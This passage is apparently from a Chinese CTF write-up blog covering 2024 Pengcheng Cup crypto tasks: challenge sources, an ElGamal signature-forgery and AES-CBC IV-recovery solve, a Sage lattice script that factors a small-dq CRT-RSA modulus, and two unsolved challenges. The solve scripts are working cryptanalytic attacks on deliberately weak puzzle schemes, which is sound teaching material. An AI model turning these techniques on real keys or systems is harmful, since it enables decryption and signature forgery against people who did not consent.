function_">chall</span>():</span><br><span class="line">    banner()</span><br><span class="line"></span><br><span class="line">    pub, pri = get_Key(<span class="number">512</span>)</span><br><span class="line">    png_data = get_pngdata()</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;Hello! I&#x27;m Alice. To ensure that you are truly Bob, I need to verify your identity first!&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Can I help you sign once? Is there anything you need to sign?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Here are your public key:<span class="subst">&#123;pub&#125;</span>&quot;</span>)</span><br><span class="line">    message = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me what you need to sign:&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> message == <span class="string">b&quot;Bob&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No, it&#x27;s not possible!!!&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Here are your sign:&quot;</span>)</span><br><span class="line">    r, s = Signature(message, pub, pri)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;r = <span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tell me your signature so that I know you are truly Bob.&quot;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;r = &quot;</span>))</span><br><span class="line">    s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;s = &quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Verity(<span class="string">b&quot;Bob&quot;</span>, (r, s), pub):</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;I have a great photo that I would like to share with you. Let&#x27;s send it to you in our old way! Hope you still keep our IV!&quot;</span></span><br><span class="line">        )</span><br><span class="line">        aes = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        enc_data = <span class="built_in">hex</span>(bytes_to_long(aes.encrypt(png_data)))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my encoded data:<span class="subst">&#123;enc_data&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Here is my key:<span class="subst">&#123;KEY.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;In summary, I wish you a wonderful day!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alright, you&#x27;re not Bob, I don&#x27;t have anything to chat with anymore.&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chall()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这道题(当时好眼熟，没看出来)，<code>ElGamal签名方案</code>，但是环境题，想放后面做，结果没时间看了</p><p>赛后再看，应该就是选择签名伪造了，这里我们可以得到消息的签名(即<code>rs</code>)，然后进行验证<br><img src="https://pic1.zhimg.com/80/v2-adb3f6da452b31564230aea1107cc62c_1440w.png" alt=""><br><a href="https://ctf-wiki.org/crypto/signature/elgamal/#_15">https://ctf-wiki.org/crypto/signature/elgamal/#_15</a><br>所以关键在于伪造消息<code>b&#39;xxxx&#39;</code>与<code>b&#39;Bob</code>模<code>p-1</code>同余，同时题目还把公钥给了我们<code>(p, g, y)</code>，有<code>p</code>就够了</p><p>其实就是费马小定理，可以这样$g^{m}\equiv g^{m+k*(p-1)}(mod\ p)$<br>代码表示，<code>message = long_to_bytes(bytes_to_long(b&#39;Bob&#39;)+pub[0]-1)</code></p><p>后面是<code>AES</code>，题目会给我们<code>KEY</code>，还是<code>CBC mode</code>，所以我们要把<code>iv</code>找出来<br><img src="https://picx.zhimg.com/80/v2-8d912081ccb73bea5ace1d9628057fa9_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-02cb496288e7eaa8013f7d6963ec8c92_1440w.png" alt=""><br>还是老样子，<code>png</code>的前十六字节是固定的，<code>0x89504e470d0a1a0a0000000d49484452</code>，我们可以把密文通过<code>key</code>解密之后的数据异或<code>png</code>的文件头，即可拿到题目中的<code>iv</code><br>然后，密文通过<code>key</code>解密之后的数据，可以自己把<code>iv</code>设成全零，即可得到</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消息伪造</span></span><br><span class="line">pub = ()</span><br><span class="line">message = bytes_to_long(<span class="string">b&#x27;Bob&#x27;</span>)+pub[<span class="number">0</span>]-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iv恢复</span></span><br><span class="line">enc_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">head = <span class="number">0x89504e470d0a1a0a0000000d49484452</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">data = bytes_to_long(aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data)[:<span class="number">16</span>]))</span><br><span class="line">iv = long_to_bytes(data ^ head)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">png_data =aes.decrypt(<span class="built_in">bytes</span>.fromhex(enc_data))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;picture.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_data)</span><br></pre></td></tr></table></figure><p>思路跟大致的脚本如上，环境也没有了，就不写交互脚本了</p><h3 id="tarssc-pcb2024-复现"><a href="#tarssc-pcb2024-复现" class="headerlink" title="tarssc-pcb2024(复现)"></a>tarssc-pcb2024(复现)</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">nbit  = <span class="number">1024</span></span><br><span class="line">beta  = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="built_in">int</span>(beta * nbit))</span><br><span class="line">q = getPrime(nbit - <span class="built_in">int</span>(beta * nbit))</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    dq = random.randrange(<span class="number">1</span>,<span class="built_in">int</span>(N ** delta))</span><br><span class="line">    <span class="keyword">if</span> dq &gt; q-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dp = random.randrange(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = Integer(crt([dp%(p-<span class="number">1</span>),dq%(q-<span class="number">1</span>)],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d,phi) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">int</span>(inverse(d,phi))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">seckey, pubkey = (p,q,d,dp,dq), (N,e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line"><span class="string">e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line"><span class="string">c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这题很明显是<code>crtRSA</code><br>看到有一题类似的，2021的极客大挑战<code>crtrsa</code><br>卡这题卡半天，可以测试一下题目的代码，发现<code>dq</code>是比<code>dp</code>小的，二者不平衡<br>可以试试<code>dq</code>泄露<a href="https://www.cnblogs.com/vconlln/p/17066500.html">https://www.cnblogs.com/vconlln/p/17066500.html</a><br>还发现了一篇论文<br><a href="https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf">https://dds.sciengine.com/cfs/files/pdfs/1674-7267/6qxpd6SSmokuc5vLD-mark.pdf</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="comment"># https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf</span></span><br><span class="line"><span class="comment"># Author: ZM__________J, To1in</span></span><br><span class="line">N = <span class="number">61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033</span></span><br><span class="line">e = <span class="number">22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161</span></span><br><span class="line">c = <span class="number">41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278</span></span><br><span class="line">alpha = log(e, N)</span><br><span class="line">beta = <span class="number">0.30</span></span><br><span class="line">delta = <span class="number">0.10</span></span><br><span class="line">P.&lt;x,y,z&gt;=PolynomialRing(ZZ)</span><br><span class="line"> </span><br><span class="line">X = ceil(<span class="number">2</span> * N^(alpha + beta + delta - <span class="number">1</span>))</span><br><span class="line">Y = ceil(<span class="number">2</span> * N^beta)</span><br><span class="line">Z = ceil(<span class="number">2</span> * N^(<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*(N-y)+N</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trans</span>(<span class="params">f</span>):</span><br><span class="line">    my_tuples = f.exponents(as_ETuples=<span class="literal">False</span>)</span><br><span class="line">    g = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> my_tuple <span class="keyword">in</span> my_tuples:</span><br><span class="line">        exponent = <span class="built_in">list</span>(my_tuple)</span><br><span class="line">        mon = x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        tmp = f.monomial_coefficient(mon)</span><br><span class="line">        </span><br><span class="line">        my_minus = <span class="built_in">min</span>(exponent[<span class="number">1</span>], exponent[<span class="number">2</span>])</span><br><span class="line">        exponent[<span class="number">1</span>] -= my_minus</span><br><span class="line">        exponent[<span class="number">2</span>] -= my_minus</span><br><span class="line">        tmp *= N^my_minus</span><br><span class="line">        tmp *= x ^ exponent[<span class="number">0</span>] * y ^ exponent[<span class="number">1</span>] * z ^ exponent[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        g += tmp</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">  </span><br><span class="line">m = <span class="number">5</span> <span class="comment"># need to be adjusted according to different situations</span></span><br><span class="line">tau = ((<span class="number">1</span> - beta)^<span class="number">2</span> - delta) / (<span class="number">2</span> * beta * (<span class="number">1</span> - beta))</span><br><span class="line">sigma = (<span class="number">1</span> - beta - delta) / (<span class="number">2</span> * (<span class="number">1</span> - beta))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(sigma * m)</span><br><span class="line"><span class="built_in">print</span>(tau * m)</span><br><span class="line"> </span><br><span class="line">s = ceil(sigma * m)</span><br><span class="line">t = ceil(tau * m)</span><br><span class="line">my_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m-i+<span class="number">1</span>):</span><br><span class="line">        g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(g_ij)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t+<span class="number">1</span>):</span><br><span class="line">        h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)</span><br><span class="line">        my_polynomials.append(h_ij)</span><br><span class="line">        </span><br><span class="line">known_set = <span class="built_in">set</span>()</span><br><span class="line">new_polynomials = []</span><br><span class="line">my_monomials = []</span><br><span class="line"> </span><br><span class="line"><span class="comment"># construct partial order</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(my_polynomials) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_polynomials)):</span><br><span class="line">        f = my_polynomials[i]</span><br><span class="line">        current_monomial_set = <span class="built_in">set</span>(x^tx * y^ty * z^tz <span class="keyword">for</span> tx, ty, tz <span class="keyword">in</span> f.exponents(as_ETuples=<span class="literal">False</span>))</span><br><span class="line">        delta_set = current_monomial_set - known_set</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(delta_set) == <span class="number">1</span>:</span><br><span class="line">            new_monomial = <span class="built_in">list</span>(delta_set)[<span class="number">0</span>]</span><br><span class="line">            my_monomials.append(new_monomial)</span><br><span class="line">            known_set |= current_monomial_set</span><br><span class="line">            new_polynomials.append(f)            </span><br><span class="line">            my_polynomials.pop(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;GG&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">my_polynomials = deepcopy(new_polynomials)</span><br><span class="line"> </span><br><span class="line">nrows = <span class="built_in">len</span>(my_polynomials)</span><br><span class="line">ncols = <span class="built_in">len</span>(my_monomials)</span><br><span class="line">L = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows)]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_scale = my_polynomials[i](X * x, Y * y, Z * z)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        L[i][j] = g_scale.monomial_coefficient(my_monomials[j])</span><br><span class="line">        </span><br><span class="line"><span class="comment"># remove N^j</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    Lii = L[i][i]</span><br><span class="line">    N_Power = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (Lii % N == <span class="number">0</span>):</span><br><span class="line">        N_Power *= N</span><br><span class="line">        Lii //= N</span><br><span class="line">    L[i][i] = Lii</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        <span class="keyword">if</span> (j != i):</span><br><span class="line">            L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))</span><br><span class="line"> </span><br><span class="line">L = Matrix(ZZ, L)</span><br><span class="line">nrows = L.nrows()</span><br><span class="line"> </span><br><span class="line">L = L.LLL()</span><br><span class="line"><span class="comment"># Recover poly</span></span><br><span class="line">reduced_polynomials = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nrows):</span><br><span class="line">    g_l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ncols):</span><br><span class="line">        g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]</span><br><span class="line">    reduced_polynomials.append(g_l)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eliminate z</span></span><br><span class="line">my_ideal_list = [y * z - N] + reduced_polynomials</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Variety</span></span><br><span class="line">my_ideal_list = [Hi.change_ring(QQ) <span class="keyword">for</span> Hi <span class="keyword">in</span> my_ideal_list]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(my_ideal_list),<span class="number">3</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)</span><br><span class="line">    <span class="keyword">if</span> V:</span><br><span class="line">        p = <span class="built_in">int</span>(V[<span class="number">0</span>][<span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">        q = N//p</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>确实是没有想到，比赛时方向一直卡在<code>crtrsa</code>，没太往<code>dp</code>泄露这边想</p><p>下面挂的是还没打出来的密码题，都大致看了一眼，当时时间不够了，一堆事围着我，吐了吐了，还是太菜了，不够快</p><h2 id="UNSOLVED"><a href="#UNSOLVED" class="headerlink" title="UNSOLVED"></a>UNSOLVED</h2><h3 id="polyprime-pcb2024"><a href="#polyprime-pcb2024" class="headerlink" title="polyprime-pcb2024"></a>polyprime-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">k = getPrime(<span class="number">333</span> * <span class="number">5</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_calc</span>(<span class="params">x</span>): </span><br><span class="line">    <span class="keyword">return</span> (x * random.randint(<span class="number">2</span>, <span class="number">5</span>)) ^ random.randint(<span class="number">100</span>, <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">some_calc</span>(<span class="params">size, depth</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sums_calc</span>(<span class="params">base, degree</span>): </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(degree): </span><br><span class="line">            temp = temp_calc(base ** i)</span><br><span class="line">            result += base ** i + temp // temp_calc(base**(i + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime_number = getPrime(size)</span><br><span class="line"></span><br><span class="line">        temp_number = temp_calc(prime_number)</span><br><span class="line">        poly_primes = sums_calc(prime_number, depth)  </span><br><span class="line">        <span class="keyword">if</span> temp_number % <span class="number">3</span> == <span class="number">0</span>: </span><br><span class="line">            temp_number = temp_calc(poly_primes)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> isPrime(poly_primes):</span><br><span class="line">            <span class="keyword">return</span> prime_number, poly_primes</span><br><span class="line"></span><br><span class="line">p, q = some_calc(<span class="number">333</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n = p * q * k</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 659401821142664131364043958430747314465977448744532421905138184036743766362324320051729418680079590835903781525157600055608268591994754328563246418114269690475272262915661210669701969695314157602927462228079044905276064391615467601628466982949165371933147600418057089432876120807721483665788557812323607370950442342057254926375842684430119320789097029996211564275310819486004520088130146630452262340185192110066151930586956190499953220051855668474863659201165952231016814569364299000130323859609047687714260776467149437031397019411599103716200258382231589757031469168245396061619327867355414287059363691024984066070128364157490336808211223714816668548049472199794493895870662970541167490686648385211854469386812214775829776376273299648505880034651930322294605482489225723014758138525637864689594748771025870209444029669477294995691067669374491852721622469656239730320092112222948718027850386898461208936333788173263904607181823233002355650353116486156927403178510412091666951574340730799316032588099237</span></span><br><span class="line"><span class="comment"># c = 455042981325030540026829365098432813829591020497037525707600104817313008442900331256387443469027825344761381076471749826547710666806180999603254398722965179851898391700090501419875562919365894255855734276825027850795202733875071307773598881254863911398285400038957998385685292965812925607278232164067624548120378758414574370042945538632864154772437639053907149514588502689277630450575630168099810584842881257614115970132960679023265157277718654731105815060916800751033956715430930381384344469220951638102432198422350425390757155267143393385221465041749156153517556389417033187856017198907366720281408810250981776112815100319814215140919133440637395953567624057248002125277569474190364142291136361144552953540727462623677375371327473687508344483184466522697912317252462246054471196345909304668083637177166153036111122244170846815657389873986264187766636830907458940128844256504176917204131708083105093700023335939233711693409336968008112511482237441198116493965744903995545941700742865846469036763734618</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br></pre></td></tr></table></figure><h3 id="rickroll-pcb2024"><a href="#rickroll-pcb2024" class="headerlink" title="rickroll-pcb2024"></a>rickroll-pcb2024</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HINT = ?</span><br><span class="line">FLAG = <span class="string">&quot;flag&#123;xxxxxxxx&#125;&quot;</span></span><br><span class="line">EFFECTIVE_ROW = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rickroll_loader</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rickroll&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = [line.strip().encode() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_ezprime</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        prime = getPrime(size)</span><br><span class="line">        <span class="keyword">if</span> isPrime(prime // <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secure_encrypt</span>(<span class="params">message_parts, hint_value</span>):</span><br><span class="line">    modulus = find_ezprime(<span class="number">260</span>)</span><br><span class="line"></span><br><span class="line">    key_material = os.urandom(<span class="number">32</span>)</span><br><span class="line">    multipliers = [getrandbits(<span class="number">256</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(EFFECTIVE_ROW)]</span><br><span class="line"></span><br><span class="line">    encrypted_parts = [</span><br><span class="line">        <span class="built_in">int</span>((multiplier * hint_value + bytes_to_long(xor(pad(chunk, <span class="number">32</span>)</span><br><span class="line">            [::-<span class="number">1</span>], key_material))) % (modulus - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> multiplier, chunk <span class="keyword">in</span> <span class="built_in">zip</span>(multipliers, message_parts)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_parts, multipliers, modulus</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    rickroll = rickroll_loader()</span><br><span class="line">    m = bytes_to_long(HINT)</span><br><span class="line"></span><br><span class="line">    encrypted_lyrics, multipliers, modulus = secure_encrypt(</span><br><span class="line">        rickroll[:EFFECTIVE_ROW], m)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S =&quot;</span>, encrypted_lyrics)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;V =&quot;</span>, multipliers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, modulus)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">S = [624073892368439332713131144655355187273652775732037030273908973687487472640419, 1129513550732743550887354593625951854836036688324123410864182971141396110133306, 1117643028354341949186759218964558582164677605237787761003042032239935547551873, 151619055620013230556169740951169935393567570823439146992800622058967940011364, 596106506159944398847755500086869373163910176213091804211992440336880292610397, 685472210701608040945173323626153641749419080165879222271110177606156013942182]</span></span><br><span class="line"><span class="string">V = [100024809269721744282017864103544473542698741247649693420201028956644193231147, 85493218764912449360009112267171851264674952927507787108286827385372626006804, 75451455656190167222034904545925816909383290106210237096763781707294423744719, 1864420400658866895837249178680154965580281261003086054650703872439476331244, 111069754111223622246512532174936637994215526100226395068812327641951277359169, 88031405587803201423744918486788030404029698214504194443110805396831023823738]</span></span><br><span class="line"><span class="string">n = 1497114501625523578039715607844306226528709444454126120151416887663514076507099</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rickroll</span></span><br><span class="line"></span><br><span class="line">Never gonna give you up</span><br><span class="line">Never gonna let you down</span><br><span class="line">Never gonna run around <span class="keyword">and</span> desert you</span><br><span class="line"></span><br><span class="line">Never gonna make you cry</span><br><span class="line">Never gonna say goodbye</span><br><span class="line">Never gonna tell a lie <span class="keyword">and</span> hurt you</span><br><span class="line"></span><br><span class="line">--A mysterious singer who does <span class="keyword">not</span> want to be named.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还得找个时间补一下，中大爷<code>Lst4r</code>干了五题，QWQ<br>（希望可以去线下玩玩吧</p><p>听说<code>web</code>有人AK了，指个路<br><a href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;SOLVED&quot;&gt;&lt;a href=&quot;#SOLVED&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
  </entry>
  
